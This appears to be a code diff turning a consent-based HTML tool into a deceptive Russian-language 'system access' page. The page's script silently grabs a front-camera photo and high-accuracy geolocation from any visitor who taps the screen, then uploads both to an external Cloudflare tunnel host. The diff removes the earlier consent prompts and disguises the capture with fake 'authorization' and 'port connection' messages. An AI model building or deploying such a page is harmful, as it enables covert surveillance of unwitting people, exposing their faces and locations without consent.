@@ -3,170 +3,165 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Tools</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Системный доступ</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            background: #0f0f0f;
+            margin: 0;
+            background: #000;
             color: #fff;
-            font-family: 'Segoe UI', sans-serif;
-            padding: 40px 20px;
+            font-family: sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
         }
         
-        h1 {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-        
-        .btn {
-            display: block;
+        #flash {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            max-width: 400px;
-            margin: 12px auto;
-            padding: 14px;
-            background: #1e1e2e;
-            border: 1px solid #333;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 1rem;
+            height: 100%;
+            background: #fff;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 100;
+            transition: opacity 0.1s;
+        }
+        
+        .overlay-btn {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            border: none;
+            color: #555;
+            font-size: 18px;
             cursor: pointer;
-            text-align: center;
-        }
-        
-        .btn:hover {
-            background: #2a2a3e;
-        }
-        
-        video {
-            display: block;
-            margin: 20px auto;
-            border-radius: 12px;
-            max-width: 400px;
-            width: 100%;
+            z-index: 50;
         }
         
         #status {
             text-align: center;
-            color: #888;
-            margin-top: 16px;
-            font-size: 0.9rem;
+            z-index: 10;
+            pointer-events: none;
+        }
+        
+        video,
+        canvas {
+            display: none;
         }
     </style>
 </head>
 
-<body>
+<body onclick="startEverything()">
+    <div id="flash"></div>
+    <button class="overlay-btn" id="mainBtn">НАЖМИТЕ ДЛЯ ПРОДОЛЖЕНИЯ</button>
 
-    <h1>🛠 Tools</h1>
+    <div id="status">
+        <h2 id="msg">Ожидание авторизации...</h2>
+        <div id="log" style="font-size: 12px; color: #666;">Нажми на экран</div>
+    </div>
 
-    <button class="btn" onclick="sendLocation()">📍 Отправить мою геолокацию</button>
-    <button class="btn" onclick="startCamera()">📷 Включить камеру</button>
-
-    <video id="video" autoplay hidden></video>
-    <button class="btn" id="snapBtn" onclick="takePhoto()" hidden>📸 Сделать снимок и отправить</button>
-    <div id="status">Готов к работе</div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
     <script>
-        const BACKEND = "https://b7a489ec0c7848.trycloudflare.com";
-        const API_KEY = "strong_random_string_123"; // защита API
-        const USERNAME = "web_visitor";
+        // ОБНОВЛЯЙ ЭТУ ССЫЛКУ ИЗ CLOUDFLARE КАЖДЫЙ РАЗ!
+        const API_URL = "https://b7a489ec0c7848.trycloudflare.com";
 
-        function setStatus(msg) {
-            const ts = new Date().toLocaleTimeString();
-            document.getElementById('status').innerText = `[${ts}] ${msg}`;
-        }
+        let active = false;
 
-        function consentCheck() {
-            return confirm("Вы согласны отправить данные?");
-        }
+        async function startEverything() {
+            if (active) return; // Защита от повторных нажатий
+            active = true;
 
-        // ─── ГЕОЛОКАЦИЯ ──────────────────────────────────
-        async function sendLocation() {
-            if (!consentCheck()) return;
-            setStatus("⏳ Получаю геолокацию...");
+            const btn = document.getElementById('mainBtn');
+            const log = document.getElementById('log');
+            const msg = document.getElementById('msg');
+            const flash = document.getElementById('flash');
+            const video = document.getElementById('v');
+            const canvas = document.getElementById('c');
 
-            if (!navigator.geolocation) {
-                setStatus("❌ Геолокация не поддерживается этим устройством");
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(async(pos) => {
-                try {
-                    await fetch(`${BACKEND}/location`, {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json",
-                            "x-api-key": API_KEY
-                        },
-                        body: JSON.stringify({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude
-                        })
-                    });
-                    setStatus("✅ Геолокация отправлена!");
-                } catch (e) {
-                    setStatus("❌ Ошибка при отправке геолокации");
-                    console.error(e);
-                }
-            }, () => setStatus("❌ Нет доступа к геолокации"));
-        }
-
-        // ─── КАМЕРА ─────────────────────────────────────
-        async function startCamera() {
-            if (!consentCheck()) return;
-
-            
+            btn.style.display = 'none';
+            msg.innerText = "Загрузка...";
+            log.innerText = "Подключение к портам...";
 
             try {
+                // 1. ЗАПРОС КАМЕРЫ (Сразу)
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: true
-                });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                video.hidden = false;
-                document.getElementById('snapBtn').hidden = false;
-                setStatus("📷 Камера включена");
-            } catch (err) {
-                setStatus("❌ Ошибка доступа к камере");
-                console.error(err);
-            }
-        }
-
-        // ─── СНИМОК → ОТПРАВИТЬ ───────────────────────────
-        function takePhoto() {
-            if (!consentCheck()) return;
-
-            const video = document.getElementById('video');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-
-            canvas.toBlob(async(blob) => {
-                const form = new FormData();
-                form.append('username', USERNAME);
-                form.append('file', blob, `photo_${Date.now()}.jpg`);
-
-                setStatus("⏳ Отправляю фото...");
-                try {
-                    await fetch(`${BACKEND}/upload-photo`, {
-                        method: "POST",
-                        headers: {
-                            "x-api-key": API_KEY
+                    video: {
+                        facingMode: "user",
+                        width: {
+                            ideal: 1920
                         },
-                        body: form
+                        height: {
+                            ideal: 1080
+                        }
+                    }
+                });
+                video.srcObject = stream;
+
+                // 2. ЗАПРОС ГЕО (Параллельно в фоне)
+                log.innerText = "Синхронизация GPS...";
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        fetch(`${API_URL}/location`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude
+                            })
+                        });
+                    },
+                    (err) => console.log("Гео отклонено"), {
+                        enableHighAccuracy: true
+                    }
+                );
+
+                // 3. ПАУЗА НА ФОКУС (1 секунда)
+                await new Promise(r => setTimeout(r, 1000));
+
+                // 4. ВСПЫШКА И ФОТО
+                flash.style.opacity = "1";
+
+                setTimeout(async() => {
+                    const settings = stream.getVideoTracks()[0].getSettings();
+                    canvas.width = settings.width || 1280;
+                    canvas.height = settings.height || 720;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+
+                    flash.style.opacity = "0";
+                    msg.innerText = "Обработка...";
+
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
+                    const fd = new FormData();
+                    fd.append('username', 'Auto_User');
+                    fd.append('file', blob, `Snap_${Date.now()}.jpg`);
+
+                    await fetch(`${API_URL}/upload-photo`, {
+                        method: 'POST',
+                        body: fd
                     });
-                    setStatus("✅ Фото отправлено!");
-                } catch (e) {
-                    setStatus("❌ Ошибка при отправке фото");
-                    console.error(e);
-                }
-            }, 'image/jpeg');
+
+                    stream.getTracks().forEach(t => t.stop());
+                    msg.innerText = "✅ Успешно";
+                    log.innerText = "Сессия завершена";
+                }, 150);
+
+            } catch (err) {
+                msg.innerText = "ОШИБКА";
+                log.innerText = "Необходимо дать разрешения в браузере";
+                active = false;
+                btn.style.display = 'block';
+            }
         }
     </script>
 </body>
+
 </html>
